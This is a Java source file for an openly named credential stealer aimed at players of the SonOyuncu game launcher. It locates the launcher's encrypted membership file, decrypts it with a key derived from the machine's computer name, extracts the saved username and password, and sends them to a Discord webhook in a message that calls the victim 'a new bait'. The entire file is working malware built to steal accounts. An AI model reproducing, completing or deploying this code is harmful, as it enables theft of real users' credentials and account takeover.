package io.github.itzgonza.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.URL;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

/**
 * @author ItzGonza
 */
public class AccountStealer {
	
	public transient static AccountStealer instance;

	private transient String username, password, webhookURL, membershipPath;
	{
		username = new String("empty");
		password = new String("empty");
		webhookURL = new String("ur_webhook_url");
		membershipPath = new String(String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/sonoyuncu-membership.json", System.getProperty("user.name")));
	};
	
	public void initialize() throws Exception {
		setUsername(new String(tools.in.getDecryptJson(membershipPath).get("sonOyuncuUsername").getAsString().getBytes(), "utf-8"));
		setPassword(new String(tools.in.getDecryptJson(membershipPath).get("sonOyuncuPassword").getAsString().getBytes(), "utf-8"));
    	
		synchronized ("Webhook Sender") {
			HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
			connection.addRequestProperty("Content-Type", "application/json");
			connection.addRequestProperty("User-Agent", "itzgonza1337.cu");
			connection.setRequestMethod("POST");
			connection.setDoOutput(true);
	    	
			connection.getOutputStream().write(String.format("{\"username\": \"eu#1337\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/852809396538048573/da5b04860ebdde2d95d9c7b44c239944.png?size=2048\", \"content\": \"\", \"embeds\": [{\"title\": \"SonOyuncu Account Stealer :dash:\", \"color\":65505, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_blue_diamond:Username **%s**\\n:small_blue_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/itzgonza\", \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\"}, \"fields\": []}], \"components\": []}", getUsername(), new String(Base64.decodeBase64(getPassword())), getUsername()).getBytes());
	    	
			connection.getOutputStream().close();
			connection.getInputStream().close();
		};
    	
	}
    
	private String getUsername() {
		return username != null & !username.isEmpty() ? username : new NullPointerException().getMessage();
	}

	private String getPassword() {
		return password != null & !password.isEmpty() ? password : new NullPointerException().getMessage();
	}

	private void setUsername(String username) {
		if (username != null & !username.isEmpty()) {
			this.username = username;
		} else {
			System.err.println("username = isEmpty() | null");
		}
	}

	private void setPassword(String password) {
		if (password != null & !password.isEmpty()) {
			this.password = password;
		} else {
			System.err.println("password = isEmpty() | null");
		}
	}
	
	enum tools {
			
		in;
		
		private JsonObject getDecryptJson(String path) {
			File file = new File(path);
			if (!file.isFile()) return null;

			try (DataInputStream dis = new DataInputStream(new FileInputStream(file))) {
				if (dis.read() != 31) return null;

				byte[] salt = new byte[8];
				dis.readFully(salt);

				byte[] encrypted = new byte[dis.readInt()];
				dis.readFully(encrypted);

				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				byte[] buffer = new byte[1024];
				int read;
				while ((read = dis.read(buffer)) != -1) {
					baos.write(buffer, 0, read);
				}

				SecretKeySpec keySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(System.getenv("computername").toCharArray(), salt, 65536, 128)).getEncoded(), "AES");

				Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
				cipher.init(Cipher.DECRYPT_MODE, keySpec, new IvParameterSpec(encrypted));

				return JsonParser.parseString(new String(cipher.doFinal(baos.toByteArray()), "utf-8")).getAsJsonObject();
			} catch(Exception ignore) {
				return JsonParser.parseString("1337").getAsJsonObject();
			}
		}
		
	}
	
}
